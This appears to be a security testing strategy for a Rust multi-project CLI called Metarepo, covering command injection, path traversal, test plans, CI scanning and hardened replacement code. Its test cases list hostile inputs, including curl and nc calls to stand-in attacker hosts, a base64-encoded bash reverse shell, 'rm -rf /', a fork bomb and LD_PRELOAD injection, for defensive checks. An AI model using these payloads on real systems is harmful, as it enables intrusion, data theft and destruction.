# Security Testing Strategy for Metarepo

## Executive Summary

This document outlines a comprehensive security testing strategy for the Metarepo project, a Rust CLI tool for multi-project management. Based on a thorough analysis of the codebase, I've identified several critical security areas requiring immediate attention, including command injection vulnerabilities, path traversal risks, and unsafe plugin system operations.

**Risk Level: HIGH** - Multiple critical vulnerabilities identified requiring immediate remediation.

## 1. Security Testing Framework

### 1.1 Testing Methodologies

#### Static Application Security Testing (SAST)
- **Primary Tool**: `cargo-audit` - Vulnerability scanning for dependencies
- **Secondary Tools**:
  - `cargo-deny` - Supply chain security and license compliance
  - `clippy` with security lints enabled
  - Custom security rules using `dylint`

#### Dynamic Application Security Testing (DAST)
- **Fuzzing**: `cargo-fuzz` and `afl.rs` for input fuzzing
- **Runtime Analysis**: `valgrind` and `miri` for memory safety
- **Behavioral Testing**: Custom test harness for command injection

#### Penetration Testing
- Manual security testing for:
  - Command injection vectors
  - Path traversal attacks
  - Environment variable manipulation
  - Resource exhaustion

#### Software Composition Analysis (SCA)
- Continuous monitoring of dependencies
- License compliance checking
- Known vulnerability tracking

### 1.2 Implementation Priority
1. **Immediate** (Week 1): Fix critical command injection vulnerabilities
2. **High** (Week 2): Implement SAST and dependency scanning
3. **Medium** (Week 3-4): Add fuzzing and DAST
4. **Ongoing**: Penetration testing and security audits

## 2. Priority Test Areas

### 2.1 Critical Risk Areas (Immediate Action Required)

#### A. Command Injection Vulnerabilities
**Severity: CRITICAL**
**Files Affected**:
- `/meta/src/plugins/worktree/mod.rs` (lines 226-229)
- `/meta/src/plugins/run/mod.rs` (lines 204-211, 266-274)
- `/meta/src/plugins/exec/plugin.rs`

**Issue**: Direct shell execution with user-controlled input
```rust
// VULNERABLE CODE EXAMPLE (worktree/mod.rs:226-229)
let mut cmd = Command::new("sh");
cmd.arg("-c")
    .arg(&worktree_init)  // User-controlled input passed to shell
    .current_dir(&worktree_path);
```

#### B. Path Traversal Vulnerabilities
**Severity: HIGH**
**Files Affected**:
- Project path construction throughout codebase
- Worktree path generation

**Issue**: Insufficient path validation allows directory traversal

#### C. Environment Variable Injection
**Severity: MEDIUM**
**Files Affected**:
- `/meta/src/plugins/run/mod.rs`
- Configuration loading modules

### 2.2 Security-Sensitive Components

1. **Plugin System** - Dynamic code loading and execution
2. **Configuration Handling** - YAML/TOML parsing and validation
3. **Git Operations** - Shell command execution
4. **Script Execution** - User-defined command running
5. **File Operations** - Path handling and file access

## 3. Specific Test Cases

### 3.1 Command Injection Test Cases

```rust
// Test Case 1: Shell Metacharacter Injection
#[test]
fn test_worktree_init_command_injection() {
    let malicious_inputs = vec![
        "test; cat /etc/passwd",
        "test && curl evil.com/steal",
        "test | nc attacker.com 4444",
        "test `whoami`",
        "test $(rm -rf /)",
        "test\n/bin/sh",
        "test;{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMC80NDQ0IDA+JjE=}|{base64,-d}|bash",
    ];

    for input in malicious_inputs {
        // Test worktree_init command with malicious input
        assert_injection_blocked(input);
    }
}

// Test Case 2: Script Name Injection
#[test]
fn test_script_name_injection() {
    let malicious_scripts = vec![
        "../../../bin/sh",
        "test;/bin/bash",
        "test\x00/etc/passwd",
        "test%20%26%26%20id",
    ];

    for script in malicious_scripts {
        assert_script_execution_safe(script);
    }
}

// Test Case 3: Environment Variable Injection
#[test]
fn test_env_var_injection() {
    let malicious_env = vec![
        ("PATH", "/tmp:$PATH"),
        ("LD_PRELOAD", "/tmp/evil.so"),
        ("BASH_ENV", "/tmp/evil.sh"),
        ("ENV", "/tmp/evil.sh"),
    ];

    for (key, value) in malicious_env {
        assert_env_var_sanitized(key, value);
    }
}
```

### 3.2 Path Traversal Test Cases

```rust
// Test Case 4: Directory Traversal
#[test]
fn test_path_traversal() {
    let malicious_paths = vec![
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32",
        "test/../../../root",
        "test/./../../etc",
        "test%2f..%2f..%2fetc",
        "test\x00../../etc",
    ];

    for path in malicious_paths {
        assert_path_confined_to_workspace(path);
    }
}

// Test Case 5: Symlink Attacks
#[test]
fn test_symlink_traversal() {
    // Create symlink pointing outside workspace
    // Verify operations don't follow symlinks outside boundary
}
```

### 3.3 Resource Exhaustion Test Cases

```rust
// Test Case 6: Fork Bomb Prevention
#[test]
fn test_fork_bomb_prevention() {
    let fork_bombs = vec![
        ":(){ :|:& };:",
        "while true; do :; done",
    ];

    for bomb in fork_bombs {
        assert_resource_limited(bomb);
    }
}

// Test Case 7: Memory Exhaustion
#[test]
fn test_memory_limits() {
    // Test with large configuration files
    // Test with recursive includes
    // Test with excessive parallel operations
}
```

### 3.4 Plugin Security Test Cases

```rust
// Test Case 8: Malicious Plugin Loading
#[test]
fn test_plugin_security() {
    // Test loading plugins from unauthorized locations
    // Test plugin capability restrictions
    // Test plugin sandboxing
}
```

## 4. Tools and Automation

### 4.1 Immediate Implementation (CI/CD Integration)

```toml
# Cargo.toml additions
[dev-dependencies]
cargo-audit = "0.18"
cargo-deny = "0.14"
cargo-fuzz = "0.11"

[profile.security]
overflow-checks = true
debug-assertions = true
```

```yaml
# .github/workflows/security.yml
name: Security Testing
on: [push, pull_request]

jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: Install cargo-audit
        run: cargo install cargo-audit
      - name: Security Audit
        run: cargo audit

  deny:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: Install cargo-deny
        run: cargo install cargo-deny
      - name: Dependency Check
        run: cargo deny check

  clippy-security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: Security Lints
        run: |
          cargo clippy -- -D warnings \
            -W clippy::unseparated_literal_suffix \
            -W clippy::mem_forget \
            -W clippy::manual_memcpy
```

### 4.2 Fuzzing Setup

```rust
// fuzz/fuzz_targets/command_injection.rs
#![no_main]
use libfuzzer_sys::fuzz_target;

fuzz_target!(|data: &[u8]| {
    if let Ok(s) = std::str::from_utf8(data) {
        // Test command execution with fuzzer input
        test_safe_command_execution(s);
    }
});
```

### 4.3 Security Testing Tools

1. **cargo-audit**: `cargo install cargo-audit`
   - Run: `cargo audit`
   - Integrate into CI/CD

2. **cargo-deny**: `cargo install cargo-deny`
   - Create `deny.toml` configuration
   - Run: `cargo deny check`

3. **cargo-fuzz**: `cargo install cargo-fuzz`
   - Initialize: `cargo fuzz init`
   - Run: `cargo fuzz run command_injection`

4. **cargo-geiger**: `cargo install cargo-geiger`
   - Check unsafe code: `cargo geiger`

5. **rustsec**: Database of security vulnerabilities
   - Automated checking via cargo-audit

## 5. Security Hardening Recommendations

### 5.1 Immediate Fixes Required

#### Fix 1: Command Injection Prevention
```rust
// CURRENT VULNERABLE CODE
let mut cmd = Command::new("sh");
cmd.arg("-c").arg(&worktree_init);

// SECURE REPLACEMENT
use shlex;

fn execute_safe_command(command_str: &str) -> Result<()> {
    // Parse command safely
    let args = shlex::split(command_str)
        .ok_or_else(|| anyhow!("Invalid command format"))?;

    if args.is_empty() {
        return Err(anyhow!("Empty command"));
    }

    // Whitelist allowed commands
    let allowed_commands = ["npm", "yarn", "make", "cargo", "python", "node"];
    if !allowed_commands.contains(&args[0].as_str()) {
        return Err(anyhow!("Command not allowed: {}", args[0]));
    }

    // Execute without shell
    let mut cmd = Command::new(&args[0]);
    if args.len() > 1 {
        cmd.args(&args[1..]);
    }

    cmd.output()?;
    Ok(())
}
```

#### Fix 2: Path Traversal Prevention
```rust
use std::path::{Path, PathBuf};

fn validate_project_path(base: &Path, untrusted: &str) -> Result<PathBuf> {
    let base = base.canonicalize()?;
    let joined = base.join(untrusted);
    let canonical = joined.canonicalize()?;

    // Ensure path is within base directory
    if !canonical.starts_with(&base) {
        return Err(anyhow!("Path traversal detected"));
    }

    Ok(canonical)
}
```

#### Fix 3: Input Validation Layer
```rust
use regex::Regex;

fn validate_branch_name(name: &str) -> Result<()> {
    // Only allow safe characters
    let re = Regex::new(r"^[a-zA-Z0-9\-_/]+$").unwrap();
    if !re.is_match(name) {
        return Err(anyhow!("Invalid branch name"));
    }

    // Prevent path traversal
    if name.contains("..") {
        return Err(anyhow!("Invalid branch name"));
    }

    Ok(())
}

fn validate_script_name(name: &str) -> Result<()> {
    // Only allow alphanumeric and limited special chars
    let re = Regex::new(r"^[a-zA-Z0-9\-_:]+$").unwrap();
    if !re.is_match(name) {
        return Err(anyhow!("Invalid script name"));
    }

    Ok(())
}
```

### 5.2 Defense in Depth Strategies

1. **Principle of Least Privilege**
   - Drop privileges when not needed
   - Use capability-based security for plugins
   - Implement proper file permissions

2. **Input Validation**
   - Whitelist approach for all user input
   - Regular expression validation
   - Length and character restrictions

3. **Command Execution Security**
   - Never use shell execution (`sh -c`)
   - Use direct command execution
   - Implement command whitelisting
   - Validate all arguments

4. **Secure Defaults**
   - Disable dangerous features by default
   - Require explicit opt-in for risky operations
   - Default to restrictive permissions

5. **Security Logging**
   ```rust
   use tracing::{info, warn};

   fn log_security_event(event: &str, details: &str) {
       warn!(
           target: "security",
           event = event,
           details = details,
           timestamp = chrono::Utc::now().to_rfc3339(),
       );
   }
   ```

## 6. Continuous Security Testing Plan

### 6.1 Development Phase
- **Pre-commit hooks**: Run clippy security lints
- **Pull Request checks**: cargo-audit, cargo-deny
- **Code review**: Security-focused review checklist

### 6.2 CI/CD Pipeline
```yaml
# Security gates in CI/CD
stages:
  - security-scan:
      - cargo audit
      - cargo deny check
      - cargo clippy --all-features -- -D warnings
      - cargo test --test security_tests

  - fuzz-testing:
      - cargo fuzz run command_injection -- -max_total_time=300
      - cargo fuzz run path_traversal -- -max_total_time=300

  - dependency-check:
      - Check for outdated dependencies
      - License compliance verification
      - Known vulnerability scanning
```

### 6.3 Production Monitoring
- Security event logging
- Anomaly detection for unusual command patterns
- Regular security audits (quarterly)
- Vulnerability disclosure program

### 6.4 Security Testing Schedule
- **Daily**: Automated SAST scans
- **Weekly**: Dependency vulnerability checks
- **Monthly**: Fuzz testing campaigns
- **Quarterly**: Penetration testing
- **Annually**: Third-party security audit

## 7. Security Metrics and KPIs

### 7.1 Key Metrics
- **Vulnerability Discovery Rate**: Track vulnerabilities found per release
- **Mean Time to Remediation (MTTR)**: Average time to fix security issues
- **Dependency Currency**: Percentage of dependencies up-to-date
- **Code Coverage**: Security test coverage percentage
- **False Positive Rate**: Track accuracy of security tools

### 7.2 Security Dashboard
```rust
// Example security metrics collection
struct SecurityMetrics {
    vulnerabilities_found: u32,
    vulnerabilities_fixed: u32,
    days_since_last_incident: u32,
    dependency_vulnerabilities: u32,
    security_test_coverage: f32,
}
```

## 8. Incident Response Plan

### 8.1 Security Incident Handling
1. **Detection**: Automated alerts from security tools
2. **Triage**: Assess severity using CVSS scoring
3. **Containment**: Immediate patches for critical issues
4. **Remediation**: Fix root cause
5. **Post-mortem**: Document lessons learned

### 8.2 Vulnerability Disclosure
- Security contact: security@metarepo.dev
- Response time: 24 hours for critical, 72 hours for others
- Coordinated disclosure: 90-day disclosure timeline

## 9. Implementation Roadmap

### Week 1 (Immediate)
- [ ] Fix command injection in worktree_init
- [ ] Fix command injection in script execution
- [ ] Implement input validation for all user inputs
- [ ] Add cargo-audit to CI/CD

### Week 2
- [ ] Implement path traversal prevention
- [ ] Add cargo-deny configuration
- [ ] Set up security testing suite
- [ ] Create security documentation

### Week 3-4
- [ ] Implement fuzzing tests
- [ ] Add resource limits
- [ ] Enhance plugin security
- [ ] Security audit of dependencies

### Month 2
- [ ] Penetration testing
- [ ] Security training for developers
- [ ] Incident response drill
- [ ] Third-party security review

## 10. Compliance and Standards

### 10.1 Security Standards
- **OWASP Top 10**: Address all relevant categories
- **CWE Top 25**: Mitigate dangerous software errors
- **NIST Cybersecurity Framework**: Implement core functions
- **ISO 27001**: Information security management

### 10.2 Secure Development Lifecycle
1. **Requirements**: Security requirements defined
2. **Design**: Threat modeling performed
3. **Implementation**: Secure coding practices
4. **Testing**: Security testing integrated
5. **Deployment**: Security controls verified
6. **Maintenance**: Continuous monitoring

## Appendix A: Security Checklist

### Pre-Release Security Checklist
- [ ] All user inputs validated
- [ ] No shell execution with user input
- [ ] Path traversal prevention implemented
- [ ] Resource limits enforced
- [ ] Dependencies updated
- [ ] Security tests passing
- [ ] Fuzzing completed
- [ ] Code review performed
- [ ] Documentation updated
- [ ] Security advisories checked

### Code Review Security Checklist
- [ ] Command execution uses safe methods
- [ ] Path operations validated
- [ ] Input validation present
- [ ] Error messages don't leak sensitive info
- [ ] Logging doesn't include secrets
- [ ] Unsafe code justified
- [ ] Dependencies justified
- [ ] Tests cover security cases

## Appendix B: Security Resources

### Tools and References
- [RustSec Advisory Database](https://rustsec.org/)
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)
- [Rust Security Guidelines](https://anssi-fr.github.io/rust-guide/)
- [cargo-audit](https://github.com/RustSec/cargo-audit)
- [cargo-deny](https://github.com/EmbarkStudios/cargo-deny)
- [cargo-fuzz](https://github.com/rust-fuzz/cargo-fuzz)

### Security Contacts
- Security Team: security@metarepo.dev
- Bug Bounty Program: bounty@metarepo.dev
- Emergency Response: incident@metarepo.dev

---

**Document Version**: 1.0
**Last Updated**: 2025-11-01
**Next Review**: 2025-12-01
**Classification**: PUBLIC

## Summary

This security testing strategy identifies critical vulnerabilities in the Metarepo project that require immediate attention. The most severe issues are command injection vulnerabilities in the worktree and script execution modules. Implementation of the recommended fixes and testing framework should begin immediately, starting with the critical command injection vulnerabilities that could allow arbitrary code execution.